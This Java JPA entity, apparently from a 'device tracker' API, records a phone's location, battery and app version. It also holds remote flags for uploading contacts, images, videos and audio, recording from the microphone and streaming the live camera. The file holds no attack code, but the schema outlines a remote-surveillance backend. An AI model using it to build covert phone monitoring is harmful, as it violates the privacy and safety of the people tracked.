package com.manish.device_tracker_api.entity;

import jakarta.persistence.*;
import lombok.*;
import java.time.LocalDateTime;

@Table(name = "device_info")
@Data
@NoArgsConstructor
@AllArgsConstructor
@Entity
public class DeviceInfo {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String username;

    @Column(nullable = false, unique = true)
    private String deviceId;

    @Column(nullable = false)
    private String deviceModel;

    @Column(nullable = false)
    private String appVersion;

    private Double latitude;

    private Double longitude;

    @Column(columnDefinition = "TEXT")
    private String address;

    private Integer battery;

    private LocalDateTime lastOnline;

    private Boolean trackingEnabled = false;

    private Integer trackingInterval = 60;

    // Contacts
    private Boolean contactsUploaded = false;
    private Boolean refreshContacts = false;

    // Images
    private Boolean imagesUploaded = false;
    private Boolean refreshImages = false;

    // Videos
    private Boolean videosUploaded = false;
    private Boolean refreshVideos = false;

    // Audio
    private Boolean audiosUploaded = false;
    private Boolean refreshAudios = false;

    // Mic Recording
    private Boolean micUploaded;
    private Boolean refreshMic;
    private Integer micDuration;

    // Live Camera
    private Boolean refreshCamera;
    private Boolean cameraStreaming;
    private String cameraSessionId;

    @Column(nullable = false)
    private LocalDateTime createdAt;

    @Column(nullable = false)
    private LocalDateTime updatedAt;

    @PrePersist
    public void prePersist() {
        this.createdAt = LocalDateTime.now();
        this.updatedAt = LocalDateTime.now();
    }

    @PreUpdate
    public void preUpdate() {
        this.updatedAt = LocalDateTime.now();
    }
}